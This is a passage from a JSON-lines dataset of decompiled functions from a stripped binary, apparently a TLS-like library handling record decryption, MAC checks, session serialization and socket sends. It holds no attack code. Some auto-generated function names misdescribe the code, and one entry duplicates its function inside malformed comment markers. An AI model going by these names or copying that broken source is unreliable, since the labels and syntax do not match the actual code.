|\nuVar18 << 0x18,\nuVar13 >> 0x18 | (uVar13 & 0xff0000) >> 8 | (uVar13 & 0xff00) << 8 |\nuVar13 << 0x18);\n}\nelse {\nlocal_118 = CONCAT44(uVar13 >> 0x18 | (uVar13 & 0xff0000) >> 8 | (uVar13 & 0xff00) << 8 |\nuVar13 << 0x18,\nuVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |\nuVar11 << 0x18);\n}\nlocal_10f = *(byte *)((long)param_2 + 1);\nlocal_10b = 0;\nlocal_10a = 0;\nlocal_109 = 0;\nlocal_10e = *(byte *)(param_2 + 1);\n*(undefined4 *)(param_1 + 0x11218) = 1;\nlocal_10d = (ushort)uVar19 >> 8 | (ushort)uVar19 << 8;\n*(uint *)(param_1 + 0x1121c) =\n(uint)*(byte *)(param_1 + 0x22329) << 8 | (uint)*(byte *)(param_1 + 0x2232a) << 0x10 |\n(uint)*(byte *)(param_1 + 0x22328) | (uint)*(byte *)(param_1 + 0x2232b) << 0x18;\n*(uint *)(param_1 + 0x11220) =\n((uint)*(byte *)(param_1 + 0x2232d) << 8 | (uint)*(byte *)(param_1 + 0x2232e) << 0x10 |\n(uint)*(byte *)(param_1 + 0x2232c) | (uint)*(byte *)(param_1 + 0x2232f) << 0x18) ^\n((uint)local_118._1_1_ << 8 | (uint)local_118._2_1_ << 0x10 | (uint)(byte)local_118 |\n(uint)local_118._3_1_ << 0x18);\n*(uint *)(param_1 + 0x11224) =\n((uint)*(byte *)(param_1 + 0x22331) << 8 | (uint)*(byte *)(param_1 + 0x22332) << 0x10 |\n(uint)*(byte *)(param_1 + 0x22330) | (uint)*(byte *)(param_1 + 0x22333) << 0x18) ^\n((uint)local_118._5_1_ << 8 | (uint)local_118._6_1_ << 0x10 | (uint)local_118._4_1_ |\n(uint)local_118._7_1_ << 0x18);\npbVar15 = (byte *)((long)iVar16 + (long)param_2);\nlocal_110 = bVar6;\nif (uVar19 != 0) {\nFUN_00404f70(param_1 + 0x111e8,pbVar15,__s,uVar19);\n}\nFUN_004254b0(param_1 + 0x111e8,&local_e8);\nFUN_00424f20(local_c8,&local_e8);\nFUN_00425390(local_c8,&local_118,0x10);\nFUN_00425390(local_c8,pbVar15,(long)(int)uVar19);\nif ((uVar19 & 0xf) != 0) {\nFUN_00425390(local_c8,&DAT_006665c0,(long)(int)(0x10 - (uVar19 & 0xf)));\n}\nlocal_108 = 0xd;\nlocal_107 = 0;\nlocal_106 = 0;\nlocal_ff = (undefined)(uVar19 >> 8);\nlocal_105 = 0;\nlocal_104 = 0;\nlocal_100 = (undefined)uVar19;\nlocal_fe = 0;\nlocal_fd = 0;\nlocal_fc = 0;\nFUN_00425390(local_c8,&local_108,0x10);\nFUN_004250f0(local_c8,local_f8);\niVar10 = memcmp(local_f8,(byte *)((long)(int)uVar19 + (long)iVar16 + (long)param_2),0x10);\nif (iVar10 != 0) {\nfree(__s);\nif (*(char *)(param_1 + 0x223c9) != '\\0') {\nreturn iVar16 + uVar19;\n}\nLAB_004331ca:\nFUN_0042a0e0(param_1,1000000);\nuVar14 = FUN_00431b00(param_1,1,0x14);\nFUN_0042ab40(uVar14);\nreturn -0xb;\n}\nLAB_00432db0:\nuVar21 = (ushort)uVar19;\n*(long *)(param_1 + 0x22378) = *(long *)(param_1 + 0x22378) + 1;\nif (bVar6 == 0x15) {\nif (uVar21 < 2) {\niVar10 = 0;\n}\nelse {\nbVar6 = pbVar22[1];\nif (*pbVar22 == 2) {\n*(undefined *)(param_1 + 0x22389) = 1;\niVar20 = -0xc;\n}\n*(byte *)(param_1 + 0x2238a) = bVar6;\niVar10 = 0;\n}\ngoto LAB_00432e16;\n}\nif (bVar6 < 0x16) {\nif (bVar6 != 0x14) {\nLAB_00433280:\nif (__s == (byte *)0x0) {\nreturn -3;\n}\nfree(__s);\nreturn -3;\n}\ngoto LAB_0043325b;\n}\nif (bVar6 == 0x16) {\niVar10 = FUN_00432490(param_1,pbVar22,uVar19 & 0xffff,param_4);\ngoto LAB_00432e16;\n}\nif (bVar6 != 0x17) goto LAB_00433280;\nlocal_150 = __s;\nif (*(char *)(param_1 + 0x22388) == -1) {\nFUN_0042ac20(param_1,pbVar22,uVar19 & 0xffff);\niVar10 = 0;\ngoto LAB_00432e16;\n}\ngoto LAB_00432dee;\n}\n}\nelse {\niVar10 = FUN_00428170(param_1,(byte *)((long)iVar16 + (long)param_2),__s,uVar18);\nif (iVar10 == 0) {\nbVar1 = __s[__size - 1] + 1;\niVar10 = uVar18 - bVar1;\nif ((0 < iVar10) && (iVar10 < (int)(uVar18 - 1))) {\nif (__s[iVar10] == __s[__size - 1]) {\npbVar15 = __s + (long)iVar10 + 1;\ndo {\nif (pbVar15 == __s + (long)iVar10 + 1 + ((uVar18 - 2) - iVar10)) goto LAB_0043337e;\nbVar4 = *pbVar15;\npbVar15 = pbVar15 + 1;\n} while (bVar4 == __s[iVar10]);\n}\nLAB_004333df:\nfree(__s);\nFUN_0042a0e0(param_1,1000000);\nuVar14 = FUN_00431b00(param_1,1,0x33);\nFUN_0042ab40(uVar14);\nreturn -2;\n}\nLAB_0043337e:\nuVar19 = uVar18 - bVar1;\nif (uVar18 <= bVar1) {\nuVar19 = uVar18;\n}\nif ((*(short *)(param_1 + 100) != 0x301) && (0x10 < uVar19)) {\npbVar22 = __s + 0x10;\nuVar19 = uVar19 - 0x10;\n}\nuVar18 = FUN_00426920(param_1);\nif (((uVar19 & 0xffff) < uVar18) || (uVar18 == 0)) goto LAB_004333df;\nlocal_e8 = *param_2;\nuVar19 = uVar19 - uVar18;\nbStack_e6 = *(byte *)(param_2 + 1);\nlocal_150._0_4_ = uVar19 & 0xffff;\nuStack_e5 = (undefined)(uVar19 >> 8);\nuStack_e4 = (undefined)uVar19;\nuVar13 = FUN_0042d750(0,param_1,&local_e8,5,pbVar22,uVar19 & 0xffff,local_c8,uVar18,uVar14);\nif ((uVar13 != uVar18) ||\n(iVar10 = memcmp(pbVar22 + (uVar19 & 0xffff),local_c8,(ulong)uVar13), iVar10 != 0)) {\nfree(__s);\nif (*(char *)(param_1 + 0x223c9) != '\\0') {\nreturn (uint)local_150 + iVar16;\n}\ngoto LAB_004331ca;\n}\ngoto LAB_00432db0;\n}\n}\nfree(__s);\nLAB_00433208:\nFUN_0042a0e0(param_1,1000000);\nreturn -2;\n}\n*(long *)(param_1 + 0x22378) = *(long *)(param_1 + 0x22378) + 1;\n__s = (byte *)0x0;\nLAB_0043325b:\n*(short *)(param_1 + 0x223cc) = *(short *)(param_1 + 0x223cc) + 1;\nlocal_150 = __s;\nif (*(char *)(param_1 + 0x22388) == '\\x02') {\n*(undefined *)(param_1 + 0xd4) = 1;\n*(undefined8 *)(param_1 + 0x22378) = 0;\niVar10 = 0;\ngoto LAB_00432e16;\n}\nLAB_00432dee:\nuVar14 = FUN_00431b00(param_1,1,10);\niVar10 = -6;\nFUN_0042ab40(uVar14);\n__s = local_150;\nLAB_00432e16:\nif (__s != (byte *)0x0) {\nfree(__s);\n}\nif (iVar10 < 0) {\nreturn iVar10;\n}\nif (iVar20 < 1) {\nreturn iVar20;\n}\nreturn iVar16 + (uint)uVar21;\n}\nLocal Variable: local_c8 : undefined1\nLocal Variable: local_e8 : undefined1[12]\nLocal Variable: local_f8 : undefined8\nLocal Variable: local_fc : undefined4\nLocal Variable: local_fd : undefined1\nLocal Variable: local_fe : undefined1\nLocal Variable: local_ff : undefined1\nLocal Variable: local_100 : undefined1\nLocal Variable: local_104 : undefined4\nLocal Variable: local_105 : undefined1\nLocal Variable: local_106 : undefined1\nLocal Variable: local_107 : undefined1\nLocal Variable: local_108 : undefined1\nLocal Variable: local_109 : undefined1\nLocal Variable: local_10a : undefined1\nLocal Variable: local_10b : undefined1\nLocal Variable: local_10d : undefined2\nLocal Variable: local_10e : undefined1\nLocal Variable: local_10f : undefined1\nLocal Variable: local_110 : undefined1\nLocal Variable: local_118 : undefined8\nLocal Variable: local_120 : undefined8\nLocal Variable: local_128 : undefined8\nLocal Variable: local_130 : undefined8\nLocal Variable: local_138 : undefined8\nLocal Variable: local_140 : undefined8\nLocal Variable: local_148 : undefined8\nLocal Variable: local_150 : undefined8\nLocal Variable: local_158 : undefined8\nLocal Variable: local_160 : undefined4\nLocal Variable: local_168 : undefined8"}
{"Function Name": "FUN_004337e0", "Address": "004337e0", "Source Code": "ulong FUN_004337e0(char *file_path, void *buffer, int bytes_to_read)\n{\n    \n    FILE *file_stream = fopen(file_path, \"rb\");\n    \n    \n    if (file_stream != (FILE *)0x0) {\n        \n        size_t bytes_read = fread(buffer, 1, (long)bytes_to_read, file_stream);\n        \n        \n        fclose(file_stream);\n        \n        \n        return bytes_read & 0xffffffff;\n    }\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_00433b40", "Address": "00433b40", "Source Code": "uint FUN_00433b40(long param_1,void *param_2,uint param_3,char param_4)\n{\nundefined uVar1;\nuint uVar2;\nvoid **ppvVar3;\nlong lVar4;\nuint uVar5;\nundefined8 uVar6;\nundefined8 *local_70;\nundefined local_5b;\nundefined local_5a;\nundefined local_59;\nundefined local_58;\nundefined local_57;\nundefined local_56;\nundefined local_55;\nundefined local_54;\nundefined local_53;\nundefined local_52;\nundefined local_51;\nundefined8 local_50;\nundefined8 local_48;\nundefined8 local_40;\nif (param_1 == 0) {\nreturn 0;\n}\nif (*(short *)(param_1 + 0x22388) != 0xff) {\nreturn 0;\n}\nif (*(char *)(param_1 + 0x223ad) == '\\0') {\nreturn 0;\n}\nif (*(long *)(param_1 + 0x223b0) == 0) {\nreturn 0;\n}\nif (*(char *)(param_1 + 0x223b8) == '\\0') {\nreturn 0;\n}\nif (*(char *)(param_1 + 0x22358) == '\\0') {\nreturn 0;\n}\nppvVar3 = (void **)FUN_00428040(0,0xfe,*(undefined2 *)(param_1 + 100));\nlocal_5b = 1;\nFUN_00428240(ppvVar3,&local_5b,1);\nlocal_5a = *(undefined *)(param_1 + 0x22388);\nFUN_00428240(ppvVar3,&local_5a,1);\nFUN_00428330(ppvVar3,*(undefined2 *)(param_1 + 0x62));\nif (*(char *)(param_1 + 0x223ac) == '\\0') {\nlocal_58 = *(undefined *)(param_1 + 0x66);\nFUN_00428240(ppvVar3,&local_58,1);\n}\nelse {\nlocal_59 = 2;\nFUN_00428240(ppvVar3,&local_59,1);\n}\nif (*(char *)(param_1 + 0x22358) == '\\x02') {\nlocal_57 = 4;\nFUN_00428240(ppvVar3,&local_57,1);\nFUN_00428240(ppvVar3,param_1 + 0x222f8,4);\nuVar6 = 4;\n}\nelse {\nif (*(char *)(param_1 + 0x22358) != '\\x03') {\nlocal_50 = 0x10;\nlocal_48 = 0;\nlocal_40 = 0;\nFUN_00423210(&local_48,&local_50,param_1 + 0xd8);\nlocal_55 = 0x10;\nFUN_00428240(ppvVar3,&local_55,1);\nFUN_00428240(ppvVar3,&local_48,local_50 & 0xffffffff);\nlocal_48 = 0;\nlocal_40 = 0;\nFUN_00423210(&local_48,&local_50,param_1 + 0x111e8);\nFUN_00428240(ppvVar3,&local_48,0x10);\ngoto LAB_00433cd4;\n}\nlocal_56 = 0xc;\nFUN_00428240(ppvVar3,&local_56,1);\nFUN_00428240(ppvVar3,param_1 + 0x222f8,0xc);\nuVar6 = 0xc;\n}\nFUN_00428240(ppvVar3,param_1 + 0x22328,uVar6);\nLAB_00433cd4:\nlocal_70 = &local_50;\nlocal_54 = *(undefined *)(param_1 + 0x223b8);\nFUN_00428240(ppvVar3,&local_54,1);\nFUN_00428240(ppvVar3,*(undefined8 *)(param_1 + 0x223b0),*(undefined *)(param_1 + 0x223b8));\nif (*(char *)(param_1 + 0x22358) == '\\x02') {\nlocal_53 = 0;\nFUN_00428240(ppvVar3,&local_53,1);\n}\nelse if (*(char *)(param_1 + 0x22358) == '\\x03') {\nlocal_52 = 0;\nFUN_00428240(ppvVar3,&local_52,1);\nlVar4 = 0;\ndo {\nuVar2 = *(uint *)(param_1 + 0xd8 + lVar4);\nlocal_48 = CONCAT44(local_48._4_4_,\nuVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 |\nuVar2 << 0x18);\nFUN_00428240(ppvVar3,&local_48,4);\nlVar4 = lVar4 + 4;\n} while (lVar4 != 0x40);\nlVar4 = 0;\ndo {\nuVar2 = *(uint *)(param_1 + 0x111e8 + lVar4);\nlocal_48 = CONCAT44(local_48._4_4_,\nuVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 |\nuVar2 << 0x18);\nFUN_00428240(ppvVar3,&local_48,4);\nlVar4 = lVar4 + 4;\n} while (lVar4 != 0x40);\nFUN_00428240(ppvVar3,param_1 + 0x118,0x40);\nFUN_00428240(ppvVar3,param_1 + 0x11228,0x40);\n}\nelse {\nuVar1 = FUN_00426920(param_1);\nlocal_51 = uVar1;\nFUN_00428240(ppvVar3,&local_51,1);\nFUN_00428240(ppvVar3,param_1 + 0x222f8,uVar1);\nFUN_00428240(ppvVar3,param_1 + 0x22328,uVar1);\n}\nif (param_4 == '\\0') {\nFUN_00428330(ppvVar3,*(undefined2 *)(param_1 + 0xc0));\nFUN_00428240(ppvVar3,*(undefined8 *)(param_1 + 0xb8),*(undefined4 *)(param_1 + 0xc0));\n}\nelse {\nFUN_00428330(ppvVar3,0);\n}\nuVar2 = (uint)*(undefined8 *)(param_1 + 0x22380);\nuVar5 = (uint)((ulong)*(undefined8 *)(param_1 + 0x22380) >> 0x20);\nlocal_48 = CONCAT44(uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 |\nuVar2 << 0x18,\nuVar5 >> 0x18 | (uVar5 & 0xff0000) >> 8 | (uVar5 & 0xff00) << 8 |\nuVar5 << 0x18);\nFUN_00428240(ppvVar3,&local_48,8);\nuVar2 = (uint)*(undefined8 *)(param_1 + 0x22378);\nuVar5 = (uint)((ulong)*(undefined8 *)(param_1 + 0x22378) >> 0x20);\nlocal_48 = CONCAT44(uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 |\nuVar2 << 0x18,\nuVar5 >> 0x18 | (uVar5 & 0xff0000) >> 8 | (uVar5 & 0xff00) << 8 |\nuVar5 << 0x18);\nFUN_00428240(ppvVar3,&local_48,8);\nuVar2 = *(uint *)(param_1 + 0x22398);\nlocal_50._0_4_ = uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 | uVar2 << 0x18;\nFUN_00428240(ppvVar3,local_70,4);\nFUN_00428240(ppvVar3,*(undefined8 *)(param_1 + 0x22390),*(undefined4 *)(param_1 + 0x22398));\nuVar2 = *(uint *)(param_1 + 0x22370);\nlocal_50._0_4_ = uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 | uVar2 << 0x18;\nFUN_00428240(ppvVar3,local_70,4);\nFUN_00428240(ppvVar3,*(undefined8 *)(param_1 + 0x22368),*(undefined4 *)(param_1 + 0x22370));\nuVar2 = *(uint *)(param_1 + 0x223a8);\nlocal_50 = CONCAT44(local_50._4_4_,\nuVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 |\nuVar2 << 0x18);\nFUN_00428240(ppvVar3,local_70,4);\nFUN_00428240(ppvVar3,*(undefined8 *)(param_1 + 0x223a0),*(undefined4 *)(param_1 + 0x223a8));\nlocal_50 = CONCAT71(local_50._1_7_,*(undefined *)(param_1 + 0x223c9));\nFUN_00428240(ppvVar3,local_70,1);\nif (*(char *)(param_1 + 0x223c9) != '\\0') {\nFUN_00428330(ppvVar3,*(undefined2 *)(param_1 + 0x223ca));\nFUN_00428330(ppvVar3,*(undefined2 *)(param_1 + 0x223cc));\n}\nif ((ppvVar3 != (void **)0x0) && (*(char *)(ppvVar3 + 2) == '\\0')) {\nFUN_0042d8f0(ppvVar3);\n}\nuVar2 = *(uint *)(ppvVar3 + 1);\nif ((param_2 != (void *)0x0) && (param_3 != 0)) {\nif (param_3 < uVar2) {\nFUN_00428100(ppvVar3);\nreturn param_3 - uVar2;\n}\nmemcpy(param_2,*ppvVar3,(ulong)uVar2);\n}\nFUN_00428100(ppvVar3);\nreturn uVar2;\n}\nLocal Variable: local_40 : undefined8\nLocal Variable: local_48 : undefined8\nLocal Variable: local_50 : undefined8\nLocal Variable: local_51 : undefined1\nLocal Variable: local_52 : undefined1\nLocal Variable: local_53 : undefined1\nLocal Variable: local_54 : undefined1\nLocal Variable: local_55 : undefined1\nLocal Variable: local_56 : undefined1\nLocal Variable: local_57 : undefined1\nLocal Variable: local_58 : undefined1\nLocal Variable: local_59 : undefined1\nLocal Variable: local_5a : undefined1\nLocal Variable: local_5b : undefined1\nLocal Variable: local_70 : undefined8\nLocal Variable: local_78 : undefined8"}
{"Function Name": "FUN_00434830", "Address": "00434830", "Source Code": "bool FUN_00434830(long input_value)\n{\n    \n    \n    return input_value == 0 || *(char *)(input_value + 0x22389) != '\\0';\n}"}
{"Function Name": "FUN_00434880", "Address": "00434880", "Source Code": "bool check_conditions(long input_address)\n{\n    \n    return (input_address != 0) && \n           \n           (*(char *)(input_address + 0x22389) == '\\0') && \n           \n           (*(char *)(input_address + 0x223ec) == '\\x01');\n}"}
{"Function Name": "FUN_00434b70", "Address": "00434b70", "Source Code": "int FUN_00434b70(int socket_fd, long data_ptr)\n{\n    long data_size; \n    ulong bytes_sent; \n    int *errno_ptr; \n    ulong result; \n    int total_bytes = 0; \n    code *send_function; \n    uint offset; \n    uint data_size_array[1] = {0}; \n    data_size = FUN_0042acc0(data_ptr, data_size_array); \n    \n    send_function = (*(long *)(data_ptr + 0x223f8) == 0) ? (code *)0x0 : *(code **)(*(long *)(data_ptr + 0x223f8) + 0x18);\n    \n    if (data_size != 0 && data_size_array[0] != 0) {\n        offset = 0; \n        do {\n            \n            if (send_function == (code *)0x0) {\n                bytes_sent = send(socket_fd, (void *)(data_size + offset), (ulong)data_size_array[0], 0); \n                result = bytes_sent & 0xffffffff; \n            } else {\n                result = (ulong)(*send_function)(); \n            }\n            \n            if ((int)result < 1) {\n                total_bytes = (int)result; \n                \n                if ((result >> 0x1f != 0) && (send_function == (code *)0x0)) {\n                    errno_ptr = __errno_location(); \n                    \n                    if ((*errno_ptr == 4) || (*errno_ptr == 0xb)) {\n                        *(uint *)(data_ptr + 0x22398) = data_size_array[0]; \n                        memmove(*(void **)(data_ptr + 0x22390), (void *)(data_size + offset), (ulong)data_size_array[0]); \n                        return total_bytes; \n                    }\n                }\n                break; \n            }\n            offset += (uint)result; \n            total_bytes += (uint)result; \n            data_size_array[0] -= (uint)result; \n        } while (data_size_array[0] != 0); \n    }\n    FUN_0042ae30(data_ptr); \n    return total_bytes; \n}"}
{"Function Name": "FUN_00434cd0", "Address": "00434cd0", "Source Code": "void FUN_00434cd0(undefined8 input_param, undefined8 data_param)\n{\n    int return_value; \n    undefined data_buffer[65536]; \n    return_value = FUN_004337e0(data_param, data_buffer, 0xffff); \n    if (return_value > 0) { \n        FUN_00431140(input_param, data_buffer, return_value); \n    }\n}"}
{"Function Name": "FUN_00434d10", "Address": "00434d10", "Source Code": "void FUN_00434d10(undefined8 inputParam, undefined8 dataParam)\n{\n    int returnValue; \n    undefined dataBuffer[65536]; \n    returnValue = FUN_004337e0(dataParam, dataBuffer, 0xffff); \n    if (returnValue > 0) { \n        FUN_004312b0(inputParam, dataBuffer, returnValue); \n    }\n}"}
{"Function Name": "FUN_00434f70", "Address": "00434f70", "Source Code": "int FUN_00434f70(long file_descriptor, char *file_path) {\n    FILE *file_stream; \n    size_t file_size; \n    void *file_contents; \n    int return_value = -1; \n    if (file_descriptor == 0) { \n        return -1; \n    }\n    \n    file_stream = fopen(file_path, \"rb\"); \n    if (file_stream != NULL) { \n        fseek(file_stream, 0, 2); \n        file_size = ftell(file_stream); \n        fseek(file_stream, 0, 0); \n        \n        if (file_size != 0 && (file_contents = malloc(file_size + 1)) != NULL) { \n            *(undefined *)((long)file_contents + file_size) = 1; \n            if (fread(file_contents, 1, file_size, file_stream) == file_size) { \n                return_value = FUN_00434970(file_descriptor, file_contents, file_size); \n                if (return_value > 0) { \n                    undefined8 *pointer_to_data = *(undefined8 **)(file_descriptor + 0x223f8); \n                    if (pointer_to_data == NULL) { \n                        pointer_to_data = (undefined8 *)malloc(0x28); \n                        if (pointer_to_data == NULL) { \n                            fclose(file_stream); \n                            return -9; \n                        }\n                        memset(pointer_to_data, 0, 0x28); \n                        *(undefined8 **)(file_descriptor + 0x223f8) = pointer_to_data; \n                    }\n                    if (pointer_to_data[1] == 0) { \n                        pointer_to_data[1] = FUN_0042fba0; \n                    }\n                }\n            }\n            free(file_contents); \n        }\n        fclose(file_stream); \n    }\n    return return_value; \n}"}
{"Function Name": "FUN_004353b0", "Address": "004353b0", "Source Code": "ulong FUN_004353b0(long input_pointer, undefined8 input_value, undefined4 input_flag)\n{\n    int *int_pointer; \n    ulong result_value; \n    undefined temp_storage[65544]; \n    \n    if (input_pointer == 0 || *(int *)(input_pointer + 0x223a8) == 0) {\n        return 0xffffffff; \n    }\n    \n    \n    int_pointer = *(int **)(input_pointer + 0x223f8);\n    \n    if (int_pointer == (int *)0x0 || *int_pointer < 0 || *(char *)(input_pointer + 0x22389) != '\\0' || *(char *)(input_pointer + 0x22388) != -1) {\n        return 0xffffffff; \n    }\n    \n    do {\n        \n        result_value = FUN_00435160(input_pointer, temp_storage, 0xffff);\n        \n        if ((int)result_value < 1) {\n            \n            if (*(int *)(input_pointer + 0x223a8) == 0) {\n                return result_value; \n            }\n            break; \n        }\n        \n        if (FUN_00433830(input_pointer, temp_storage, result_value & 0xffffffff, *(undefined8 *)(int_pointer + 2)) > 0) {\n            \n            FUN_00434b70(*int_pointer, input_pointer);\n        }\n    } while (*(int *)(input_pointer + 0x223a8) == 0); \n    \n    return FUN_0042aee0(input_pointer, input_value, input_flag);\n}"}
{"Function Name": "FUN_00435560", "Address": "00435560", "Source Code": "\\*\nundefined [16] FUN_00435560(ulong param_1, ulong param_2, ulong param_3, ulong param_4)\n{\n    undefined intermediateResults [16]; \n    undefined calculations [16]; \n    undefined divisionResult [16]; \n    undefined finalResult [16]; \n    undefined shiftedValues [16]; \n    undefined shiftedCalculations [16]; \n    undefined divisionOutcome [16]; \n    undefined shiftedParam3 [16]; \n    byte bitShiftParam3; \n    byte bitShiftParam4; \n    ulong highestSetBit; \n    ulong finalCalculation; \n    if (param_4 == 0) { \n        if (param_3 <= param_2) { \n            if (param_3 == 0) { \n                param_3 = SUB168((ZEXT816(0) << 0x40 | ZEXT816(1)) / ZEXT816(0), 0); \n            }\n            intermediateResults._0_8_ = param_3; \n            calculations._0_8_ = param_1; \n            calculations._8_8_ = param_2 % param_3; \n            divisionResult._0_8_ = SUB168(calculations / intermediateResults, 0); \n            divisionResult._8_8_ = param_2 / param_3; \n            return divisionResult; \n        }\n        finalResult._0_8_ = SUB168(param_1 / param_3, 0); \n        finalResult._8_8_ = 0; \n        return finalResult; \n    }\n    if (param_2 < param_4) { \n        return ZEXT816(0); \n    }\n    highestSetBit = 0x3f; \n    if (param_4 != 0) { \n        for (; param_4 >> highestSetBit == 0; highestSetBit = highestSetBit - 1) {} \n    }\n    bitShiftParam4 = (byte)(highestSetBit ^ 0x3f); \n    if ((int)(highestSetBit ^ 0x3f) == 0) { \n        if ((param_1 < param_3) && (param_2 <= param_4)) { \n            return ZEXT816(0); \n        }\n        return ZEXT816(1); \n    }\n    bitShiftParam3 = 0x40 - bitShiftParam4; \n    shiftedValues._0_8_ = param_3 >> (bitShiftParam3 & 0x3f) | param_4 << (bitShiftParam4 & 0x3f); \n    shiftedCalculations._0_8_ = param_1 >> (bitShiftParam3 & 0x3f) | param_2 << (bitShiftParam4 & 0x3f); \n    ulong uVar15 = SUB168(shiftedCalculations / shiftedValues, 0); \n    highestSetBit = SUB168(shiftedCalculations % shiftedValues, 0); \n    divisionOutcome._0_8_ = uVar15; \n    shiftedParam3._0_8_ = param_3 << (bitShiftParam4 & 0x3f); \n    finalCalculation = SUB168(divisionOutcome * shiftedParam3, 8); \n    if ((finalCalculation <= highestSetBit) && ((SUB168(divisionOutcome * shiftedParam3, 0) <= param_1 << (bitShiftParam4 & 0x3f) || (highestSetBit != finalCalculation)))) { \n        divisionOutcome._8_8_ = 0; \n        return divisionOutcome; \n    }\n    finalResult._0_8_ = uVar15 - 1; \n    finalResult._8_8_ = 0; \n    return finalResult; \n}\n*\\ \n \nundefined [16] FUN_00435560(ulong param_1, ulong param_2, ulong param_3, ulong param_4)\n{\n    undefined intermediateResults [16];\n    undefined calculations [16];\n    undefined divisionResult [16];\n    undefined finalResult [16];\n    undefined shiftedValues [16];\n    undefined shiftedCalculations [16];\n    undefined divisionOutcome [16];\n    undefined shiftedParam3 [16];\n    byte bitShiftParam3;\n    byte bitShiftParam4;\n    ulong highestSetBit;\n    ulong finalCalculation;\n    if (param_4 == 0) {\n        if (param_3 <= param_2) {\n            if (param_3 == 0) {\n                param_3 = SUB168((ZEXT816(0) << 0x40 | ZEXT816(1)) / ZEXT816(0), 0);\n            }\n            intermediateResults._0_8_ = param_3;\n            calculations._0_8_ = param_1;\n            calculations._8_8_ = param_2 % param_3;\n            divisionResult._0_8_ = SUB168(calculations / intermediateResults, 0);\n            divisionResult._8_8_ = param_2 / param_3;\n            return divisionResult;\n        }\n        finalResult._0_8_ = SUB168(param_1 / param_3, 0);\n        finalResult._8_8_ = 0;\n        return finalResult;\n    }\n    if (param_2 < param_4) {\n        return ZEXT816(0);\n    }\n    highestSetBit = 0x3f;\n    if (param_4 != 0) {\n        for (; param_4 >> highestSetBit == 0; highestSetBit = highestSetBit - 1) {}\n    }\n    bitShiftParam4 = (byte)(highestSetBit ^ 0x3f);\n    if ((int)(highestSetBit ^ 0x3f) == 0) {\n        if ((param_1 < param_3) && (param_2 <= param_4)) {\n            return ZEXT816(0);\n        }\n        return ZEXT816(1);\n    }\n    bitShiftParam3 = 0x40 - bitShiftParam4;\n    shiftedValues._0_8_ = param_3 >> (bitShiftParam3 & 0x3f) | param_4 << (bitShiftParam4 & 0x3f);\n    shiftedCalculations._0_8_ = param_1 >> (bitShiftParam3 & 0x3f) | param_2 << (bitShiftParam4 & 0x3f);\n    ulong uVar15 = SUB168(shiftedCalculations / shiftedValues, 0);\n    highestSetBit = SUB168(shiftedCalculations % shiftedValues, 0);\n    divisionOutcome._0_8_ = uVar15;\n    shiftedParam3._0_8_ = param_3 << (bitShiftParam4 & 0x3f);\n    finalCalculation = SUB168(divisionOutcome * shiftedParam3, 8);\n    if ((finalCalculation <= highestSetBit) && ((SUB168(divisionOutcome * shiftedParam3, 0) <= param_1 << (bitShiftParam4 & 0x3f) || (highestSetBit != finalCalculation)))) {\n        divisionOutcome._8_8_ = 0;\n        return divisionOutcome;\n    }\n    finalResult._0_8_ = uVar15 - 1;\n    finalResult._8_8_ = 0;\n    return finalResult;\n}"}
{"Function Name": "FUN_00435680", "Address": "00435680", "Source Code": "void FUN_00435680(undefined4 input_param_1, undefined8 input_param_2, undefined8 input_param_3)\n{\n    \n    initialize_data_segment();\n    \n    \n    (*(code *)(&data_init_array)[0])(input_param_1, input_param_2, input_param_3);\n    \n    \n    return;\n}"}
{"Function Name": "FUN_00434b20", "Address": "00434b20", "Source Code": "void executeFunction(void)\n{\n    \n}"}
{"Function Name": "_DT_FINI", "Address": "004356f4", "Source Code": "void finalizeDataTransfer(void) {}"}
{"Function Name": "FUN_00434cc0", "Address": "00434cc0", "Source Code": "undefined8 getUndefinedInteger(void)\n{\n    \n    return 0;\n}"}
{"Function Name": "FUN_00401b20", "Address": "00401b20", "Source Code": "undefined8 returnUndefinedInteger(void)\n{\n    \n    return 0;\n}"}
{"Function Name": "FUN_0042f5b0", "Address": "0042f5b0", "Source Code": "void executeFunction(void) {\n    \n}"}
{"Function Name": "FUN_00401b00", "Address": "00401b00", "Source Code": "undefined8 returnZeroFunction(void) \n{\n    return 0; \n}"}
{"Function Name": "FUN_00401ad0", "Address": "00401ad0", "Source Code": "undefined8 returnZeroFunction(void)\n{\n    return 0; \n}"}
{"Function Name": "FUN_00434b60", "Address": "00434b60", "Source Code": "void executeFunction(void) {\n    \n}"}
{"Function Name": "FUN_00401ae0", "Address": "00401ae0", "Source Code": "undefined8 function_return_zero(void)\n{\n    \n    return 0;\n}"}
{"Function Name": "FUN_00434b10", "Address": "00434b10", "Source Code": "undefined8 return_one_function(void) \n{\n    return 1; \n}"}
{"Function Name": "FUN_004356f0", "Address": "004356f0", "Source Code": "void executeFunction(void) {\n    \n}"}
{"Function Name": "FUN_004015d0", "Address": "004015d0", "Source Code": "void executeFunction(void) {\n    \n}"}
{"Function Name": "FUN_00434b30", "Address": "00434b30", "Source Code": "void executeFunction(void) {\n    \n}"}
{"Function Name": "FUN_00434aa0", "Address": "00434aa0", "Source Code": "undefined8 calculateUndefinedValue(void) \n{\n    return -17; \n}"}
{"Function Name": "FUN_004015a0", "Address": "004015a0", "Source Code": "void executeFunction(void) {\n    \n}"}
{"Function Name": "FUN_00434b40", "Address": "00434b40", "Source Code": "void executeFunction(void) {\n    \n}"}
{"Function Name": "FUN_00401b10", "Address": "00401b10", "Source Code": "undefined8 getUndefinedInteger(void)\n{\n    \n    return 0;\n}"}
{"Function Name": "FUN_00434cb0", "Address": "00434cb0", "Source Code": "undefined8 returnInteger(void) \n{\n    return 1; \n}"}
{"Function Name": "FUN_00434b50", "Address": "00434b50", "Source Code": "void executeFunction(void) {\n    \n}"}
{"Function Name": "FUN_00404310", "Address": "00404310", "Source Code": "void executeFunction(void) {\n    \n}"}
